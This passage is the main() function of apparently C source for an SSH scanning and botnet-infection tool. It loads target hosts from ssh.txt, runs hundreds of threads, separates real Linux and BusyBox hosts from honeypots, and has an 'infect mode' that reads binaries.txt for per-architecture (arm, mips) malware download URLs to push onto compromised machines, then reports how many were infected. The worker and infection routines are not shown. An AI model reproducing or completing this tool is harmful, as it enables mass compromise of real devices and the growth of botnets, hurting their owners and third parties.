            g_infect = 1;
        else if (!strcmp(argv[i], "-h")) {
            printf("Usage: %s [-t threads] [-T timeout] [-c max_conn] [-i nic] [-I]\n", argv[0]);
            printf("  -t  Threads (default: 200)\n");
            printf("  -T  Timeout (default: 5)\n");
            printf("  -c  Max connections (default: 1000)\n");
            printf("  -i  Network interface to bind (auto-detect if omitted)\n");
            printf("  -I  Enable infect mode (requires binaries.txt)\n");
            return 0;
        }
    }

    raise_limits();
    detect_nic();

    if (!load_targets("ssh.txt")) {
        printf("Need ssh.txt\n");
        return 1;
    }

    if (g_infect) {
        int nb = load_binaries("binaries.txt");
        if (nb <= 0) {
            printf("%sERROR:%s Infect mode enabled but binaries.txt not found or empty!\n", C_RED, C_RESET);
            printf("Create binaries.txt with format:\n");
            printf("  \"http://host/path/binary_arm\" - \"arm\"\n");
            printf("  \"http://host/path/binary_mips\" - \"mips\"\n");
            return 1;
        }
        printf("%sINFECT MODE:%s Loaded %d binary entries from binaries.txt\n", C_RED, C_RESET, nb);
        for (int i = 0; i < g_nbins; i++)
            printf("  [%d] arch=%s%s%s url=%s%s%s\n", i, C_CYAN, g_bins[i].arch, C_RESET, C_GRAY, g_bins[i].url, C_RESET);
        printf("\n");
        usleep(2000000);
    }

    sem_init(&g_sem, 0, g_maxconn);
    rawssh_global_init();

    printf(HIDE_CURSOR);
    g_start = time(NULL);

    pthread_attr_t attr;
    pthread_attr_init(&attr);
    pthread_attr_setstacksize(&attr, 128 * 1024);

    pthread_t panel;
    pthread_create(&panel, NULL, panel_fn, NULL);

    pthread_t *pool = malloc(g_threads * sizeof(pthread_t));
    int n = 0;
    for (int i = 0; i < g_threads; i++) {
        if (!pthread_create(&pool[i], &attr, worker_fn, NULL))
            n++;
    }

    for (int i = 0; i < n; i++)
        pthread_join(pool[i], NULL);

    atomic_store(&g_run, 0);
    usleep(600000);
    pthread_join(panel, NULL);

    printf(SHOW_CURSOR);
    printf("\n  %sDONE!%s Found: %d (Real: %d, HP: %d)\n",
           C_BOLD, C_RESET, atomic_load(&G_found), atomic_load(&G_real), atomic_load(&G_hp));
    if (g_infect)
        printf("  %sInfected:%s %d  %sFailed:%s %d\n",
               C_RED, C_RESET, atomic_load(&G_infected),
               C_GRAY, C_RESET, atomic_load(&G_infect_fail));
    if (atomic_load(&G_real) || atomic_load(&G_hp) == 0)
        printf("  %s> valid_linux.txt%s\n", C_GREEN, C_RESET);
    if (atomic_load(&G_hp))
        printf("  %s> honeypots.txt%s\n", C_ORANGE, C_RESET);
    if (g_infect)
        printf("  %s> logs_real_linuxes_busyboxes.txt%s\n", C_CYAN, C_RESET);
    printf("\n");

    sem_destroy(&g_sem);
    free(pool);
    free(g_targets);
    free(g_results);
    if (g_bins) free(g_bins);
    rawssh_global_cleanup();
    return 0;
}